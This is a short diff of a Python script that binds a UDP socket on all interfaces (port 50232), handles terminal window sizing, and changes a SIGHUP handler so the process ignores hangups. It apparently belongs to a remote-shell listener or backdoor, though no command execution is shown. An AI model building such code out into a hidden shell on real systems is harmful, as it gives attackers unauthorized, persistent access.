@@ -3,9 +3,7 @@
 import socket
 import base64
 import subprocess
-import pty
 import os
-import sys
 import termios
 import struct
 import fcntl
@@ -28,7 +26,7 @@ def set_winsize(fd, row, col, xpix=0, ypix=0):
     fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
 
 
-signal.signal(signal.SIGHUP, lambda x, y: print('haha'))
+signal.signal(signal.SIGHUP, lambda x, y: None)
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.bind(('0.0.0.0', 50232))
 
